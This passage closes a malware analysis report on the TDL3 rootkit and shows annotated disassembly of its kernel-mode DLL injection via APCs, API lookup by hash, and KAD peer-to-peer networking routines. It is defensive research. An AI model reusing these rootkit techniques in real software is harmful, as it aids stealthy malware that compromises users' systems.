Reference_Function\n.text:10005431         call  FindKernel_bySidtCall\n.text:10005431\n.text:10005436         push  eax\n.text:10005437         call  FindAPIbyHash\n.text:10005437\n.text:1000543C         push  esi\n.text:1000543D         push  esi\n.text:1000543E         push  esi\n.text:1000543F         push  esi\n.text:10005440         push  edi       ; TDL3.LoadLibraryExA\n.text:10005440\n.text:10005441         push  esi\n.text:10005442         push  [ebp+curr_thread]\n.text:10005445         push  ebx\n.text:10005446         call  eax       ; nt!KeInitializeApc\n\n#### Figure XVII LoadImageNotify Handler\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n41 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### The DLL injection concept used is itself trivial and is commonly used by other malwares in user mode. User mode injection generally will obtain a handle to the target process, allocate a memory space inside the target process' space to put the DLL name to be injected in that allocation and finally creating a remote thread pointing to LoadLibrary. The driver injector routine implements something similar; calling KeStackAttachProcess, giving the malware thread access to the target process’ address space; it then allocates a memory space inside the process’ context to write the path of the DLL component to be injected. It initializes an APC thread pointing to the kernel32!LoadLibary function, with parameters addressed to the DLL name inside the process’ memory context. And finally, like a charm, the DLL is loaded in the context of the launched process.\n VI.11 Worker Threads and KAD Protocol\n Some early TDL3 variants contain a P2P module using the Kademlia-based DHT protocol (KAD), which is known as the most widely used DHT-based protocol. \n Implementing this module involves creating additional worker threads in order to initiate a P2P connection to known servers and peers. \n\n### .text:100047EE /*\n.text:100047EE  KAD Protocol Standard Port for Send/Recv Messages\n.text:100047EE */\n.text:100047EE         push  1240h      ; KAD Protocol\nStandard Port = 4672\n.text:100047F3         mov   [ebp+device_udp], cx\n.text:100047F7         mov   [ebp+var_16], 'd'\n.text:100047FD         mov   [ebp+var_12], 'v' ; MajorVersion\n.text:10004803         mov   [ebp+var_10], 'i'\n.text:10004809         mov   [ebp+var_E], 'c' ; NumberOfFunctions\n.text:1000480F         mov   [ebp+var_A], cx\n.text:10004813         mov   [ebp+var_8], 'u'\n.text:10004819         mov   [ebp+var_6], 'd' ;\nAddressOfNameOrdinals\n.text:1000481F         mov   [ebp+var_4], 'p'\n.text:10004825         mov   [ebp+var_2], di\n.text:10004829         mov   [ebp+device_tcp], cx\n.text:1000482D         mov   [ebp+var_2E], 'd'\n.text:10004833         mov   [ebp+var_2A], 'v'\n.text:10004839         mov   [ebp+var_28], 'i'\n.text:1000483F         mov   [ebp+var_26], 'c'\n.text:10004845         mov   [ebp+var_22], cx\n.text:10004849         mov   [ebp+var_20], 't'\n.text:1000484F         mov   [ebp+var_1E], 'c'\n.text:10004855         mov   [ebp+var_1C], 'p'\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n42 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n.text:1000485B         mov   [ebp+var_1A], di\n.text:1000485F         mov   eax, ds:0FFDF0308h\n.text:10004864         push  edi\n.text:10004865         add   eax, 678h\n.text:1000486A         push  eax\n.text:1000486B         lea   eax, [ebp+device_udp]\n.text:1000486E         push  eax\n.text:1000486F /*\n.text:1000486F kd> dt _OBJECT_ATTRIBUTES f7bc6f14\n.text:1000486F nt!_OBJECT_ATTRIBUTES\n.text:1000486F  +0x000 Length      : 0x18\n.text:1000486F  +0x004 RootDirectory  : (null)\n.text:1000486F  +0x008 ObjectName    : 0xf7bc6f48 _UNICODE_STRING\n\"\\device\\udp\"\n.text:1000486F  +0x00c Attributes    : 0x240\n.text:1000486F  +0x010 SecurityDescriptor : (null)\n.text:1000486F  +0x014 SecurityQualityOfService : (null)\n.text:1000486F */\n.text:1000486F         call  TDIOpenTransport\n.text:1000486F\n.text:10004874         test  eax, eax\n.text:10004876         mov   ebx, 0DE45E96Ch ; hash :\nExAllocatePool\n.text:1000487B         jl   short SetUp_UpDown_loadingFiles\n.text:1000487B\n.text:1000487D         push  ebx\n.text:1000487E         call  FindKernel_bySidtCall\n.text:1000487E\n.text:10004883         push  eax\n.text:10004884         call  FindAPIbyHash\n.text:10004884\n.text:10004889         push  10h\n.text:1000488B         push  edi\n.text:1000488C         call  eax       ; ExAllocatePool\n.text:1000488C\n.text:1000488E         mov   esi, eax\n.text:10004890         cmp   esi, edi\n.text:10004892         jz   short SetUp_UpDown_loadingFiles\n.text:10004892\n.text:10004894         call  ComputeDelta\n.text:10004894\n.text:10004899 /*\n.text:10004899  Execute Worker routine\n.text:10004899 UDP :\n.text:10004899 kd> dt _WORK_QUEUE_ITEM 82a969f8 -r\n.text:10004899 nt!_WORK_QUEUE_ITEM\n.text:10004899  +0x000 List       : _LIST_ENTRY [ 0x0 - 0x0 ]\n.text:10004899    +0x000 Flink      : (null)\n.text:10004899    +0x004 Blink      : (null)\n.text:10004899  +0x008 WorkerRoutine  : 0x82cf882a   void\n+ffffffff82cf882a\n.text:10004899  +0x00c Parameter    : 0x82a969f8\n.text:10004899\n.text:10004899\n.text:10004899 */\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n43 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n.text:10004899\n.text:10004899         add   eax, 0F57824A6h ; xref :\nTDIReceiveDatagram\n.text:1000489E         push  7E91282h    ; hash :\nExQueueWorkItem\n.text:100048A3         mov   [esi+_WORK_QUEUE_ITEM.WorkerRoutine],\neax\n.text:100048A6         mov   [esi+_WORK_QUEUE_ITEM.Parameter], esi\n.text:100048A9         mov   [esi+_WORK_QUEUE_ITEM.List.Flink], edi\n.text:100048AB         call  FindKernel_bySidtCall\n.text:100048AB\n.text:100048B0         push  eax\n.text:100048B1         call  FindAPIbyHash\n.text:100048B1\n.text:100048B6         push  1\n.text:100048B8         push  esi\n.text:100048B9         call  eax       ; ExQueueWorkItem\n.text:100048B9\n.text:100048BB\n.text:100048BB SetUp_UpDown_loadingFiles:       ; CODE XREF:\nWorkerRoutine_ForTCPandUDP+AEj\n.text:100048BB                     ;\nWorkerRoutine_ForTCPandUDP+C5j\n.text:100048BB         mov   eax, ds:0FFDF0308h\n.text:100048C0         push  1236h      ; KAD Protocol\nStandard Port for Up/Downloading files = 4662\n.text:100048C5         push  edi\n.text:100048C6         add   eax, 690h\n.text:100048CB         push  eax\n.text:100048CC         lea   eax, [ebp+device_tcp]\n.text:100048CF         push  eax\n.text:100048D0 /*\n.text:100048D0 kd> dt _OBJECT_ATTRIBUTES f7bc6f14 -r\n.text:100048D0 nt!_OBJECT_ATTRIBUTES\n.text:100048D0  +0x000 Length      : 0x18\n.text:100048D0  +0x004 RootDirectory  : (null)\n.text:100048D0  +0x008 ObjectName    : 0xf7bc6f48 _UNICODE_STRING\n\"\\device\\tcp\"\n.text:100048D0    +0x000 Length      : 0x16\n.text:100048D0    +0x002 MaximumLength  : 0x18\n.text:100048D0    +0x004 Buffer      : 0xf7bc6f74 \"\\device\\tcp\"\n.text:100048D0  +0x00c Attributes    : 0x240\n.text:100048D0  +0x010 SecurityDescriptor : (null)\n.text:100048D0  +0x014 SecurityQualityOfService : (null)\n.text:100048D0 */\n.text:100048D0         call  TDIOpenTransport\n.text:100048D0\n.text:100048D5         test  eax, eax\n.text:100048D7         jl   short loc_10004917\n.text:100048D7\n.text:100048D9         push  ebx\n.text:100048DA         call  FindKernel_bySidtCall\n.text:100048DA\n.text:100048DF         push  eax\n.text:100048E0         call  FindAPIbyHash\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n44 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n.text:100048E0\n.text:100048E5         push  10h\n.text:100048E7         push  edi\n.text:100048E8         call  eax       ; ExAllocatePool\n.text:100048E8\n.text:100048EA         mov   esi, eax\n.text:100048EC         cmp   esi, edi\n.text:100048EE         jz   short loc_10004917\n.text:100048EE\n.text:100048F0         call  ComputeDelta\n.text:100048F0\n.text:100048F5         add   eax, 0F578272Ch ; xref :\nTDLListenForConnection\n.text:100048FA         push  7E91282h    ; hash :\nExQueueWorkItem\n.text:100048FF         mov   [esi+_WORK_QUEUE_ITEM.WorkerRoutine],\neax\n.text:10004902         mov   [esi+_WORK_QUEUE_ITEM.Parameter], esi\n.text:10004905         mov   [esi+_WORK_QUEUE_ITEM.List.Flink], edi\n.text:10004907         call  FindKernel_bySidtCall\n.text:10004907\n.text:1000490C         push  eax\n.text:1000490D         call  FindAPIbyHash\n.text:1000490D\n.text:10004912         push  1\n.text:10004914         push  esi\n.text:10004915         call  eax       ; ExQueueWorkItem\n\nOpens KAD Service Port:\n\n.text:10002292         push  ebp\n.text:10002293         mov   ebp, esp\n.text:10002295         sub   esp, 68h\n.text:10002298         push  ebx\n.text:10002299         push  esi\n.text:1000229A         mov   esi, [ebp+devobj]\n.text:1000229D         push  edi\n.text:1000229E         push  esi\n.text:1000229F         call  TDIQueryAddress\n.text:1000229F\n.text:100022A4         mov   edi, eax\n.text:100022A6         xor   ebx, ebx\n.text:100022A8         cmp   edi, ebx\n.text:100022AA         jl   loc_100023FC\n.text:100022AA\n.text:100022B0         mov   eax,\n\n[esi+DEVICE_OBJECT.AttachedDevice]\n.text:100022B3         mov   eax, [eax+DRIVER_OBJECT.DeviceObject]\n.text:100022B6         push  0AA66EFD6h   ; hash :\nIoBuildDeviceIoControlRequest\n.text:100022BB         mov   edi, 0C000009Ah\n.text:100022C0         mov   [ebp+devobj], eax\n.text:100022C3         call  FindKernel_bySidtCall\n.text:100022C3\n.text:100022C8         push  eax\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n45 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n.text:100022C9         call  FindAPIbyHash\n.text:100022C9\n.text:100022CE         push  ebx\n.text:100022CF         push  ebx\n.text:100022D0         push  1\n.text:100022D2         push  ebx\n.text:100022D3         push  ebx\n.text:100022D4         push  ebx\n.text:100022D5         push  ebx\n.text:100022D6         push  [ebp+devobj]\n.text:100022D9         push  3\n.text:100022DB /*\n.text:100022DB kd> !devobj 82cb7860\n.text:100022DB Device object (82cb7860) is for:\n.text:100022DB Tcp \\Driver\\Tcpip DriverObject 82c5e9a8\n.text:100022DB Current Irp 00000000 RefCount 91 Type 00000012 Flags 00000050\n.text:100022DB Dacl e1699c64 DevExt 00000000 DevObjExt 82cb7918\n.text:100022DB ExtensionFlags (0000000000)\n.text:100022DB Device queue is not busy.\n.text:100022DB */\n.text:100022DB         call  eax       ;\nIoBuildDeviceIoControlRequest\n.text:100022DB\n.text:100022DD         cmp   eax, ebx\n.text:100022DF         mov   [ebp+devobj], eax\n.text:100022E2         jz   loc_100023FC\n.text:100022E2\n.text:100022E8         mov   edi, 2C655ACDh ; hash : nt!memset\n.text:100022ED         push  edi\n.text:100022EE         call  FindKernel_bySidtCall\n.text:100022EE\n.text:100022F3         push  eax\n.text:100022F4         call  FindAPIbyHash\n.text:100022F4\n.text:100022F9         push  2Eh\n.text:100022FB         lea   ecx,\n\n[ebp+_TDI_CONNECTION_INFORMATION.UserDataLength]\n.text:100022FE         push  ebx\n.text:100022FF         push  ecx\n.text:10002300         call  eax       ; memset\n.text:10002300\n.text:10002302         add   esp, 0Ch\n.text:10002305         lea   eax,\n\n[ebp+_TA_IP_ADDRESS.TAAdressCount]\n.text:10002308         push  edi\n.text:10002309         mov\n\n[ebp+_TDI_CONNECTION_INFORMATION.RemoteAddressLength], 16h\n.text:10002310         mov\n\n[ebp+_TDI_CONNECTION_INFORMATION.RemoteAddress], eax\n.text:10002313         mov   [ebp+_TA_IP_ADDRESS.TAAdressCount], 1\n.text:1000231A         mov\n\n[ebp+_TA_IP_ADDRESS._TA_ADDRESS_IP.AdressLength], 0Eh\n.text:10002320         mov\n\n[ebp+_TA_IP_ADDRESS._TA_ADDRESS_IP.AdressType], TDI_ADDRESS_TYPE_IP\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n46 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n.text:10002326         mov\n\n[ebp+_TA_IP_ADDRESS._TA_ADDRESS_IP._TDI_ADDRESS_IP.in_addr], ebx\n.text:10002329         mov\n\n[ebp+_TA_IP_ADDRESS._TA_ADDRESS_IP._TDI_ADDRESS_IP.sin_port], bx\n.text:1000232D         call  FindKernel_bySidtCall\n.text:1000232D\n.text:10002332         push  eax\n.text:10002333         call  FindAPIbyHash\n.text:10002333\n.text:10002338         push  2Eh\n.text:1000233A         lea   ecx,\n\n[ebp+__TDI_CONNECTION_INFORMATION.UserDataLength]\n.text:1000233D         push  ebx\n.text:1000233E         push  ecx\n.text:1000233F         call  eax       ; memset\n.text:1000233F\n.text:10002341         mov   ecx, [ebp+devobj]\n.text:10002344         mov\n\n[ebp+__TDI_CONNECTION_INFORMATION.RemoteAddressLength], 16h\n.text:1000234B         mov   [ebp+__TA_IP_ADDRESS.TAAdressCount], 1\n.text:10002352         mov\n\n[ebp+__TA_IP_ADDRESS._TA_ADDRESS_IP.AdressLength], 0Eh\n.text:10002358         mov\n\n[ebp+__TA_IP_ADDRESS._TA_ADDRESS_IP.AdressType], TDI_ADDRESS_TYPE_IP\n.text:1000235E         mov\n\n[ebp+__TA_IP_ADDRESS._TA_ADDRESS_IP._TDI_ADDRESS_IP.in_addr], ebx\n.text:10002361         mov\n\n[ebp+__TA_IP_ADDRESS._TA_ADDRESS_IP._TDI_ADDRESS_IP.sin_port], bx\n.text:10002365         lea   eax,\n\n[ebp+__TA_IP_ADDRESS.TAAdressCount]\n.text:10002368         mov\n\n[ebp+__TDI_CONNECTION_INFORMATION.RemoteAddress], eax\n.text:1000236B         mov   eax, dword ptr\n\n[ecx+IRP.Tail.Overlay.anonymous_1.anonymous_0] ; IO_STACK_LOCATION\n.text:1000236E         mov   [eax-8], ebx  ;\n_IO_STACK_LOCATION.CompletionRoutine\n.text:10002371         mov   [eax-4], ebx  ;\n_IO_STACK_LOCATION.Context\n.text:10002374         mov   [eax-21h], bl  ;\n_IO_STACK_LOCATION.Control\n.text:10002377         sub   eax, 24h\n.text:1000237A         mov   eax, [ecx+60h] ; IO_STACK_LOCATION\n.text:1000237D         sub   eax, 24h\n.text:10002380         mov   [eax+IO_STACK_LOCATION.MajorFunction],\nIRP_MJ_INTERNAL_DEVICE_CONTROL\n.text:10002383         mov   [eax+IO_STACK_LOCATION.MinorFunction],\nTDI_LISTEN\n.text:10002387         mov   edx, [esi+10h]\n.text:1000238A         mov   edx, [edx+_FILE_OBJECT.DeviceObject]\n.text:1000238D         mov   [eax+IO_STACK_LOCATION.DeviceObject],\nedx\n.text:10002390         mov   edx, [esi+8]\n.text:10002393         mov   [eax+IO_STACK_LOCATION.FileObject],\nedx\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n47 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n.text:10002396         lea   edx,\n\n[ebp+_TDI_CONNECTION_INFORMATION.UserDataLength]\n.text:10002399         mov\n\n[eax+IO_STACK_LOCATION.Parameters.DeviceIoControl.InputBufferLength], edx\n.text:1000239C         mov\n\n[eax+IO_STACK_LOCATION.Parameters.DeviceIoControl.OutputBufferLength], ebx\n.text:1000239F         lea   edx,\n\n[ebp+__TDI_CONNECTION_INFORMATION.UserDataLength]\n.text:100023A2         mov\n\n[eax+IO_STACK_LOCATION.Parameters.DeviceIoControl.IoControlCode], edx\n.text:100023A5         add   esp, 0Ch\n.text:100023A8         lea   eax, [ebp+var_8]\n.text:100023AB         push  eax\n.text:100023AC         mov   eax, [esi+10h]\n.text:100023AF         push  [eax+_FILE_OBJECT.DeviceObject]\n.text:100023B2         push  ecx\n.text:100023B3         call  TDICall\n.text:100023B3\n.text:100023B8         mov   edi, eax\n.text:100023BA         cmp   edi, ebx\n.text:100023BC         jl   short loc_100023FC\n.text:100023BC\n.text:100023BE /*\n.text:100023BE  Change Endiannes\n.text:100023BE */\n.text:100023BE         mov   ecx,\n\n[ebp+__TDI_CONNECTION_INFORMATION.RemoteAddress]\n.text:100023C1         mov   eax, [ecx+0Ah] ;\nTA_ADDRESS.TA_ADDRESS_IP.TDI_ADDRESS_IP.in_addr\n.text:100023C4         mov   edx, eax\n.text:100023C6         mov   [ebp+devobj], eax ; AABBCCDD\n.text:100023C9         and   eax, 0FF00h   ; 0000CC00\n.text:100023CE         shl   edx, 10h    ; CCDD0000\n.text:100023D1         or   edx, eax    ; CCDDCC00\n.text:100023D3\n.text:100023D3         xor   eax, eax\n.text:100023D5         mov   ah, byte ptr [ebp+devobj+2] ; 0000BB00\n.text:100023D8         shl   edx, 8     ; DDCC0000\n.text:100023DB\n.text:100023DB         or   edx, eax    ; DDCCBB00\n.text:100023DD         movzx  eax, byte ptr [ecx+0Dh] ; 000000AA\n.text:100023E1         or   edx, eax    ; DDCCBBAA\n.text:100023E3         mov   eax, [ebp+in_addr]\n\nReturns Opened Port and IP address:\n\n.text:100023E6         mov   [eax], edx\n.text:100023E8         movzx  eax, word ptr [ecx+8] ;\nTA_ADDRESS.TA_ADDRESS_IP.TDI_ADDRESS_IP.sin_port\n.text:100023EC         movzx  cx, ah\n.text:100023F0         shl   eax, 8\n.text:100023F3         add   cx, ax\n.text:100023F6         mov   eax, [ebp+port]\n.text:100023F9         mov   [eax], cx\n.text:100023F9\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n48 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\nSetup TDI Receive Event for accepting UDP connections:\n\n### .text:100025E9         push  2Eh\n.text:100025EB         lea   ecx,\n\n[ebp+_TDI_CONNECTION_INFORMATION.UserDataLength] ; ReceiveInfo Buffer\n.text:100025EE         push  ebx\n.text:100025EF         push  ecx\n.text:100025F0         call  eax       ; memset\n.text:100025F0\n.text:100025F2         mov\n\n[ebp+_TDI_CONNECTION_INFORMATION.RemoteAddressLength], 16h\n.text:100025F9         mov   [ebp+_TA_IP_ADDRESS.TAAdressCount], 1\n.text:10002600         mov\n\n[ebp+_TA_IP_ADDRESS._TA_ADDRESS_IP.AdressLength], 0Eh\n.text:10002606         mov\n\n[ebp+_TA_IP_ADDRESS._TA_ADDRESS_IP.AdressType], TDI_ADDRESS_TYPE_IP\n.text:1000260C         mov\n\n[ebp+_TA_IP_ADDRESS._TA_ADDRESS_IP._TDI_ADDRESS_IP.in_addr], ebx\n.text:1000260F         mov\n\n[ebp+_TA_IP_ADDRESS._TA_ADDRESS_IP._TDI_ADDRESS_IP.sin_port], bx\n.text:10002613         lea   eax,\n\n[ebp+_TA_IP_ADDRESS.TAAdressCount]\n.text:10002616         mov\n\n[ebp+_TDI_CONNECTION_INFORMATION.RemoteAddress], eax\n.text:10002619         mov   eax, dword ptr\n\n[esi+IRP.Tail.Overlay.anonymous_1.anonymous_0] ; IO_STACK_LOCATION of next\nlower driver's I/O\n.text:1000261C /*\n.text:1000261C  Package IOCTL Request Packet\n.text:1000261C  Setup ClientEventReceiveDatagram\n.text:1000261C */\n.text:1000261C         mov   [eax-8], ebx  ;\n_IO_STACK_LOCATION.CompletionRoutine\n.text:1000261F         mov   [eax-4], ebx  ;\n_IO_STACK_LOCATION.Context\n.text:10002622         mov   [eax-21h], bl  ;\n_IO_STACK_LOCATION.Control = METHOD_BUFFERED\n.text:10002625         sub   eax, 24h    ; point to next io\nstack\n.text:10002628         mov   eax, dword ptr\n\n[esi+IRP.Tail.Overlay.anonymous_1.anonymous_0]\n.text:1000262B /*\n.text:1000262B  IoStack = next IrpStackLocation\n.text:1000262B */\n.text:1000262B         sub   eax, 24h    ; point to CURRENT\nIO_STACK_LOCATION\n.text:1000262E         mov   [eax+IO_STACK_LOCATION.MajorFunction],\nIRP_MJ_INTERNAL_DEVICE_CONTROL\n.text:10002631         mov   [eax+IO_STACK_LOCATION.MinorFunction],\nTDI_RECEIVE_DATAGRAM\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n49 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n.text:10002635         mov   ecx, [edi+10h]\n.text:10002638         mov   ecx, [ecx+_FILE_OBJECT.DeviceObject]\n.text:1000263B         mov   [eax+IO_STACK_LOCATION.DeviceObject],\necx\n.text:1000263E         mov   ecx, [edi+10h]\n.text:10002641         mov   [eax+IO_STACK_LOCATION.FileObject],\necx ; FileObject\n.text:10002644         mov   ecx, [ebp+_buffer_size_]\n.text:10002647         mov\n\n[eax+IO_STACK_LOCATION.Parameters.DeviceIoControl.OutputBufferLength], ecx\n.text:1000264A         lea   ecx, [ebp+InputBufferLength]\n.text:1000264D         mov\n\n[eax+IO_STACK_LOCATION.Parameters.DeviceIoControl.InputBufferLength], ecx\n.text:10002650         mov\n\n[eax+IO_STACK_LOCATION.Parameters.DeviceIoControl.Type3InputBuffer], 20h\n.text:10002657         lea   ecx,\n\n[ebp+_TDI_CONNECTION_INFORMATION.UserDataLength]\n.text:1000265A         mov\n\n[eax+IO_STACK_LOCATION.Parameters.DeviceIoControl.IoControlCode], ecx\n.text:1000265D         mov   eax, [ebp+buffer_ffdf0308_678_mdl] ;\n_MDL\n.text:10002660         mov   [esi+IRP.MdlAddress], eax\n.text:10002663         add   esp, 0Ch\n.text:10002666 /*\n.text:10002666 kd> dt _IO_STATUS_BLOCK f5a02cf8\n.text:10002666 nt!_IO_STATUS_BLOCK\n.text:10002666  +0x000 Status      : -2100336419\n.text:10002666  +0x000 Pointer     : 0x82cf68dd\n.text:10002666  +0x004 Information   : 8\n.text:10002666 */\n.text:10002666         lea   eax,\n\n[ebp+IO_STATUS_BLOCK.anonymous.status]\n.text:10002669         push  eax\n.text:1000266A         mov   eax, [edi+10h]\n.text:1000266D         push  [eax+_FILE_OBJECT.DeviceObject]\n.text:10002670         push  esi       ; IRP\n.text:10002671 /*\n.text:10002671  TDIQueryDeviceControl\n.text:10002671 */\n.text:10002671         call  TDICall\n.text:10002671\n\nWhen UDP packet is received, checks validity of KAD packet:\n\n.text:100045D7         movzx  eax, byte ptr [esi]\n.text:100045DA         add   esp, 14h\n.text:100045DD         sub   eax, KAD_STANDARD_PACKET ; eMule-Kad =\n0xE4 standard packet\n.text:100045DD                     ;       0xE5\nzlib Compressed packets\n.text:100045E2         jz   short KAD_StandardPacket\n.text:100045E2\n.text:100045E4         dec   eax       ;\nKAD_ZLIB_COMPRESSED_PACKET\n.text:100045E5         jnz   _RECEIVE_MORE_\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n50 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\nChecks whether a HandShake is being initiated and sends necessary reply:\n\n.text:10004638 KAD_StandardPacket:           ; CODE XREF:\nTDIReceiveDatagram+13Cj\n.text:10004638         mov   edi, [ebp+BUFFER]\n.text:10004638\n.text:1000463B\n.text:1000463B check_values_in_buffer:         ; CODE XREF:\nTDIReceiveDatagram+190j\n.text:1000463B         movzx  eax, [esi+kad_protocol.Opcode]\n.text:1000463F         cmp   eax, KAD_SEARCH_RES ;\n<HASH(KEY)[16]><CNT1[2]><HASH(ANSWER)[16]><CNT2[2]><META>*(CNT2))*(CNT1)\n.text:10004642         jg   short KAD_PUBLISHED_or_FIREWALLED\n.text:10004642\n.text:10004644         jz   _RECEIVE_MORE_\n.text:10004644\n.text:1000464A         cmp   eax, KAD_HELLO_REQ ;\n<PEER(SENDER)[25]>\n.text:1000464D         jz   short KAD_HELLO_REQUEST\n.text:1000464D\n.text:1000464F         cmp   eax, KAD_HELLO_RES ;\n<PEER(RECEIVER)[25]>\n.text:10004652         jz   short KAD_HELLO_RESPONSE\n.text:10004652\n.text:10004654         cmp   eax, KAD_REQ  ;\n<TYPE[1]><HASH(TARGET)[16]><HASH(RECEIVER)[16]>\n.text:10004657         jz   short KAD_REQUEST\n.text:10004657\n.text:10004659         cmp   eax, KAD_RES  ;\n<HASH(TARGET)[16]><CNT><PEER[25]>*(CNT)\n\nChecks for Publish Requests:\n\n.text:100046AA KAD_PUBLISHED_or_FIREWALLED:      ; CODE XREF:\nTDIReceiveDatagram+19Cj\n.text:100046AA         sub   eax, KAD_PUBLISH_REQ ;\n<HASH(KEY)[16]<CNT1[2]><HASH(TARGET)[16]><CNT2[2]><META>*(CNT2)*(CNT1)\n.text:100046AD         jz   short KAD_PUBLISH_REQUEST\n.text:100046AD\n.text:100046AF         sub   eax, 8     ; KAD_PUBLISH_RES\n.text:100046B2         jz   _RECEIVE_MORE_\n.text:100046B2\n.text:100046B8         sub   eax, 8     ; KAD_FIREWALLED_REQ\n.text:100046BB         jz   short KAD_FIREWALLED_REQUEST\n.text:100046BB\n.text:100046BD         sub   eax, 8     ; KAD_FIREWALLED_RES\n.text:100046C0         jz   short KAD_FIREWALLED_RESPONSE\n.text:100046C0\n\n#### Figure XVIII Early KAD Funtionalities\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n51 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### Base on the functions seen in the malware, the majority of the functions are involved in Response. Handshake functionality is supported, but the necessary bootstrap functions to join a KAD network are not. Furthermore, when a PUBLISH request is received the malware only stores details from the received request, which is expected to be “string” information(s); no further action is taken. Should this be taken as an indication that the malware is spying on KAD networks?\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n52 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### VI.12 Related Works and References\n TDL3 analysis - http://rootbiez.blogspot.com/2009/11/rootkit-tdl3-why-so-serious-lets##### put.html\n#### Exploiting KAD - http://ccr.sigcomm.org/online/files/p65-steiner.pdf Performance Evaluation of KAD - http://www.di.unipi.it/~ricci/MasterThesisBrunner.pdf File Caching - http://msdn.microsoft.com/en-us/library/aa364218(VS.85).aspx For symbol information - http://msdn.microsoft.com/en-us/library/default.aspx For sample code implementations - http://www.osronline.com/\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n53 / 53\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://archive.f-secure.com/weblog/archives/The_Case_of__TDL3.pdf"
    ],
    "report_names": [
        "The_Case_of__TDL3.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716494,
    "ts_updated_at": 1743041167,
    "ts_creation_date": 1277738748,
    "ts_modification_date": 1277738748,
    "files": {
        "pdf": "https://archive.orkl.eu/d28b24b3334b77323b3b7875778b30d11a8f667f.pdf",
        "text": "https://archive.orkl.eu/d28b24b3334b77323b3b7875778b30d11a8f667f.txt",
        "img": "https://archive.orkl.eu/d28b24b3334b77323b3b7875778b30d11a8f667f.jpg"
    }
}